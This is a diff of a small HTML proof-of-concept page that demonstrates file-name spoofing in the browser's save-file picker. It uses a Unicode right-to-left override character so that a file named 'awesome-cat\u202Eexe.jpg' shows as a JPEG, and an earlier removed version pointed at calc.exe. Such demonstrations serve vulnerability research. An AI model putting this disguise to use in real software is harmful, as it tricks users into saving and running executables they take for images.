@@ -15,7 +15,7 @@
 
     <hr>
     <h3>Gif example/proof:</h3>
-    <a href="rtltrick.gif" target="_blank">GIFFFFFF URL</a>
+    <a href="rtltrick.gif" target="_blank">GIFFFFFF URLLLLLLLLLLL</a>
     <hr>
     <h3>Code example/proof:</h3>
     <div style="display: flex; flex-direction: column">
@@ -30,17 +30,16 @@
         const butSaveNewFile = document.getElementById('addNewFile')
         butSaveNewFile.addEventListener('mouseup', async () => {
             const options = {
-                types: [
-                    {
-                        description:
-                            'JPEG Image (*.jpeg)',
-                        suggestedName: {
-                            'text/plain': ['.\u202egepj\u202e.moc.segami.www.exe']
-                        },
-                        content: 'C:\\Windows\\system32\\calc.exe'
-                    }
-                ]
+    suggestedName: 'awesome-cat\u202Eexe.jpg',
+    types: [
+        {
+            description: 'JPEG Image (*.jpeg)',
+            accept: {
+                'image/jpeg': ['.jpg']
             }
+        }
+    ]
+}
             debugger;
 
             const handle = await window.showSaveFilePicker(options)
